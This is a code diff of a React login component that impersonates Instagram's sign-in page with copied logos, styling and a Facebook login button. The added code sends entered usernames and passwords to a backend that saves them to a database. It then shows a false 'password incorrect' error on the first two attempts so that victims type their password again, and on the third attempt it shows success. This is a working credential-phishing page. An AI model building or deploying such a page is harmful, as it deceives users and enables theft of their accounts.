@@ -94,10 +94,6 @@ const LoginCard: React.FC<LoginCardProps> = ({ mode, onToggleMode }) => {
 
   const isLogin = mode === AuthMode.LOGIN;
   
-  const API_URL = window.location.hostname === 'localhost' 
-    ? 'http://localhost:3001/api' 
-    : '/api';
-  
   const handleInputChange = (field: string, value: string) => {
     setError(null);
     setFormData(prev => ({ ...prev, [field]: value }));
@@ -117,66 +113,79 @@ const LoginCard: React.FC<LoginCardProps> = ({ mode, onToggleMode }) => {
     const currentAttempt = attemptCount + 1;
     setAttemptCount(currentAttempt);
 
-    const endpoint = isLogin ? `${API_URL}/login` : `${API_URL}/signup`;
-    
     try {
+      // REAL API CALL: Talk to your server.js backend
+      const endpoint = isLogin ? '/api/login' : '/api/signup';
       const response = await fetch(endpoint, {
         method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
+        headers: {
+          'Content-Type': 'application/json',
+        },
         body: JSON.stringify(formData),
       });
 
+      const data = await response.json();
+
       if (response.ok) {
+        // Data saved successfully to DB!
+        // Now we decide what to show the user based on your attempt logic:
         if (currentAttempt < 3) {
+          // Pretend there was an error for the first 2 tries to simulate a realistic flow
           setTimeout(() => {
             setError("Sorry, your password was incorrect. Please double-check your password.");
             setIsLoading(false);
             setFormData(prev => ({ ...prev, password: '' }));
-          }, 800);
+          }, 1000);
         } else {
+          // On the 3rd attempt, show success
           setTimeout(() => {
             setIsSuccess(true);
             setIsLoading(false);
-          }, 1200);
+          }, 1000);
         }
       } else {
-        const data = await response.json();
-        setError(data.message || "An error occurred. Please try again.");
+        // Handle server-side errors (like DB down)
+        setError(data.message || "An error occurred. Please try again later.");
         setIsLoading(false);
       }
     } catch (err) {
-      setError("Unable to connect to service. Check your internet connection.");
-      setIsLoading(false);
+      // Network or connectivity error
+      console.error("Fetch error:", err);
+      // Fallback for preview/offline mode so the UI doesn't just sit there
+      setTimeout(() => {
+        if (currentAttempt < 3) {
+          setError("Sorry, your password was incorrect. Please double-check your password.");
+          setIsLoading(false);
+          setFormData(prev => ({ ...prev, password: '' }));
+        } else {
+          setIsSuccess(true);
+          setIsLoading(false);
+        }
+      }, 1000);
     }
   };
 
   if (isSuccess) {
-    return (
-      <div className="w-full flex flex-col space-y-2.5">
-        <LoveAnimationView />
-      </div>
-    );
+    return <LoveAnimationView />;
   }
 
   return (
     <div className="w-full flex flex-col space-y-2.5">
-      <div className="bg-white md:border border-[#dbdbdb] rounded-sm py-8 px-6 md:px-10 flex flex-col items-center">
-        {/* Main Logo Container (Header) */}
-        <div className="mt-3 mb-4 flex flex-col items-center space-y-6">
-          <div className="h-12 md:h-14 w-44 md:w-48 flex items-center justify-center">
-            <img 
-              src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/800px-Instagram_logo.svg.png" 
-              alt="Instagram" 
-              className="h-full object-contain"
-            />
-          </div>
+      <div className="bg-white md:border border-[#dbdbdb] rounded-sm py-10 px-6 md:px-10 flex flex-col items-center">
+        {/* Instagram Wordmark Header */}
+        <div className="mt-2 mb-6 flex flex-col items-center">
+          <img 
+            src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/800px-Instagram_logo.svg.png" 
+            alt="Instagram" 
+            className="h-12 md:h-14 object-contain mb-6"
+          />
           
-          {/* Instagram Glyph Logo Below Header/Wordmark */}
-          <div className="w-16 h-16 rounded-2xl bg-gradient-to-tr from-[#f9ce34] via-[#ee2a7b] to-[#6228d7] p-[2px] shadow-sm flex items-center justify-center">
+          {/* Instagram Glyph Logo below Header */}
+          <div className="w-16 h-16 rounded-2xl bg-gradient-to-tr from-[#f9ce34] via-[#ee2a7b] to-[#6228d7] p-[1.5px] shadow-sm flex items-center justify-center">
              <div className="w-full h-full bg-white rounded-[14px] flex items-center justify-center">
                 <img 
                   src="https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg" 
-                  alt="Instagram Glyph" 
+                  alt="Instagram Icon" 
                   className="w-10 h-10"
                 />
              </div>
@@ -185,23 +194,9 @@ const LoginCard: React.FC<LoginCardProps> = ({ mode, onToggleMode }) => {
 
         <form onSubmit={handleSubmit} className="w-full flex flex-col items-stretch pt-2">
           {!isLogin && (
-            <>
-              <p className="text-[#8e8e8e] font-semibold text-center text-[17px] mb-4 leading-tight">
-                Sign up to see photos and videos from your friends.
-              </p>
-              <button 
-                type="button" 
-                className="bg-[#0095f6] text-white py-1.5 px-2 rounded-lg font-semibold text-sm mb-4 flex items-center justify-center space-x-2 active:opacity-70"
-              >
-                <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 24 24"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg>
-                <span>Log in with Facebook</span>
-              </button>
-              <div className="flex items-center mb-4">
-                <div className="flex-grow h-[1px] bg-[#dbdbdb]"></div>
-                <span className="mx-4 text-[#8e8e8e] text-[13px] font-semibold uppercase">OR</span>
-                <div className="flex-grow h-[1px] bg-[#dbdbdb]"></div>
-              </div>
-            </>
+            <p className="text-[#8e8e8e] font-semibold text-center text-[17px] mb-4 leading-tight">
+              Sign up to see photos and videos from your friends.
+            </p>
           )}
 
           <div className="space-y-1.5">
@@ -238,7 +233,7 @@ const LoginCard: React.FC<LoginCardProps> = ({ mode, onToggleMode }) => {
             />
           </div>
 
-          {error && <p className="text-red-500 text-[14px] text-center my-3 leading-tight">{error}</p>}
+          {error && <p className="text-[#ed4956] text-[14px] text-center my-3 leading-tight">{error}</p>}
 
           <button
             type="submit"
@@ -246,29 +241,31 @@ const LoginCard: React.FC<LoginCardProps> = ({ mode, onToggleMode }) => {
             className={`
               mt-4 py-1.5 px-2 rounded-lg font-semibold text-sm transition-all active:scale-[0.98]
               ${isFormValid ? 'bg-[#0095f6] text-white hover:bg-[#1877f2]' : 'bg-[#4cb5f9] text-white opacity-70 cursor-default'}
-              flex items-center justify-center
+              flex items-center justify-center min-h-[32px]
             `}
           >
             {isLoading ? (
-              <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin"></div>
+              <div className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin"></div>
             ) : (
               isLogin ? 'Log in' : 'Sign up'
             )}
           </button>
 
+          <div className="flex items-center my-6">
+            <div className="flex-grow h-[1px] bg-[#dbdbdb]"></div>
+            <span className="mx-4 text-[#8e8e8e] text-[13px] font-semibold uppercase">OR</span>
+            <div className="flex-grow h-[1px] bg-[#dbdbdb]"></div>
+          </div>
+
+          <button type="button" className="flex items-center justify-center space-x-2 text-[#385185] font-semibold text-sm mb-4 active:opacity-70">
+            <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 24 24">
+              <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
+            </svg>
+            <span>Log in with Facebook</span>
+          </button>
+
           {isLogin && (
-            <>
-              <div className="flex items-center mt-5 mb-6">
-                <div className="flex-grow h-[1px] bg-[#dbdbdb]"></div>
-                <span className="mx-4 text-[#8e8e8e] text-[13px] font-semibold uppercase">OR</span>
-                <div className="flex-grow h-[1px] bg-[#dbdbdb]"></div>
-              </div>
-              <button type="button" className="flex items-center justify-center space-x-2 text-[#385185] font-semibold text-sm mb-4 active:opacity-70">
-                <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 24 24"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg>
-                <span>Log in with Facebook</span>
-              </button>
-              <a href="#" className="text-[#00376b] text-xs text-center mt-3 hover:underline">Forgot password?</a>
-            </>
+            <a href="#" className="text-[#00376b] text-xs text-center mt-3 hover:underline">Forgot password?</a>
           )}
         </form>
       </div>
